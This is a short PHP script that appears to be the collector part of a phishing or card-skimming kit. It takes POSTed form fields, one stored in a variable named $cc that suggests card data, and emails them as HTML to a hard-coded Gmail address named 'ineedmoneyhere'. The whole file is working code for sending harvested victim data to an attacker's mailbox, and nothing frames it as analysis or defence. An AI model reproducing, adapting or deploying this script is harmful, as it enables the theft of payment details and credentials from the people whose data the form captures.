<?php 

$subject = $_POST['subject'];
$cc = $_POST['data']; 


$from = "ineedmoneyhere@gmail.com";
$to = "ineedmoneyhere@gmail.com";


mail($to, $subject, $cc, "MIME-Version: 1.0\r\nContent-type: text/html; charset=iso-8859-1\r\nFrom: $from\r\nReply-to: $from\r\n");


?>